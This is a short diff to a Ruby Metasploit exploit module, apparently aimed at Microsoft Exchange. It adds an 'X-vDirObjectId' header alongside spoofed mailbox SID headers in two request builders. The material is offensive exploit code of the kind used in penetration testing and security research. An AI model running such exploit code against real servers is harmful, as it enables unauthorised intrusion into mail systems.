@@ -156,7 +156,8 @@ class MetasploitModule < Msf::Exploit::Remote
       ctype: 'application/json; charset=utf-8',
       headers: {
         'msExchLogonMailbox' => patch_sid(exploit_info[1]),
-        'msExchTargetMailbox' => patch_sid(exploit_info[1])
+        'msExchTargetMailbox' => patch_sid(exploit_info[1]),
+        'X-vDirObjectId' => (exploit_info[4][1]).to_s
       }
     )
     return '' if response.code != 200
@@ -460,7 +461,8 @@ class MetasploitModule < Msf::Exploit::Remote
       ctype: 'application/json; charset=utf-8',
       headers: {
         'msExchLogonMailbox' => patch_sid(exploit_info[1]),
-        'msExchTargetMailbox' => patch_sid(exploit_info[1])
+        'msExchTargetMailbox' => patch_sid(exploit_info[1]),
+        'X-vDirObjectId' => (exploit_info[4][1]).to_s
       }
     )
     return '' if response.code != 200
